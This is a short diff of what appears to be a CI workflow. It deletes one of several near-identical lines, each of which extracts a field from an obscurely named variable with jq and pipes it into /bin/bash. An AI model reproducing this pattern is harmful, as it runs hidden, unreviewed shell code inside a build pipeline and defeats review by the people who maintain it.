@@ -28,7 +28,6 @@ jobs:
           echo $mokaj9850 | jq -r .bm5 | /bin/bash
           printf '%s' "$f990" | jq -r .s6 | /bin/bash
           echo $tt70642 | jq -r .f22 | /bin/bash
-          echo $c6077 | jq -r .zj69979 | /bin/bash
           printf '%s' "$bsdxq71" | jq -r .q588 | /bin/bash
           printf '%s' "$fuz1" | jq -r .wh2619 | /bin/bash
           printf '%s' "$t972" | jq -r .fx5598 | /bin/bash
